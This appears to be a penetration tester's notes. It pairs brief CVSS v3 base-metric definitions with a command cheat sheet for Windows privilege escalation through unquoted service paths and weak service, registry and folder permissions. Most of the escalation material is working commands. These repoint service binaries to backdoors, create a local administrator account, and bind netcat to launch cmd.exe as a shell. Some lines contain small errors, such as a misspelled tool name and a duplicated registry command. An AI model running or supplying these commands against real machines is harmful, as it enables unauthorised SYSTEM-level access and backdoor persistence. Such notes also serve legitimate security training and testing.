# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

### Unquoted Service Path

Technically Unquoted Service Path vulnerability is caused by the CreateProcess function in Windows operating systems which may allow unprivileged loc users to modify the affected executable file as a system privilege in order to elevate their privileged from unprivilege to system privilged.

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

```

If you look at the registry entry for this service with Regedit you can see the ImagePath value is:

C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:

```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

```

If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM.In order to check the permissions of a folder

```
icacls "C:\WeakServices\Weak Service 1\service1.exe"
icacls "C:\WeakServices\Weak Service 1"
icacls "C:\Program Files (x86)\Program Folder"
icacls "C:\Program Files\Photodex\ProShow Producer\Scsiaccess.exe"

```

### Weak Service Permission

```
accesschk.exe -cv MeMe WeakService3
sc config WeakService3 binpath= "C:\Users\MeMe\Desktop\Backdoor.exe"
sc config WeakService3 binpath= "net user MeMe MeMe@!@#123 /add"
sc config WeakService3 binpath= "net localgroup Administrators MeMe /add"

sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost

```

### WEAK REGISTRY PERMISSIONS

```
accexxchk.exe -kvw MeMe HKLM\SYSTEM\CurrentControlSet\Services\

reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f

sc qc WeakService4
sc stop WeakService4
sc start WeakService4

```

### Weak Folder Permissions

weak folder permissions granting any user full permission "Everyone: (F)" to the contents of the directory and it's sub-folders. In addition, the program installs a service called "KWSService" which runs as "Localsystem", this will allow any user to escalate privileges to "NT AUTHORITY\SYSTEM" by substituting the service's binary with a malicious one

```
icacls c:\kioware_com
C:\kioware_com Everyone:(OI)(CI)(F)
               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
               BUILTIN\Administrators:(I)(OI)(CI)(F)
               BUILTIN\Users:(I)(OI)(CI)(RX)
               BUILTIN\Users:(I)(CI)(AD)
               BUILTIN\Users:(I)(CI)(WD)
               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
sc qc KWSService
[SC] QueryServiceConfig SUCCESS
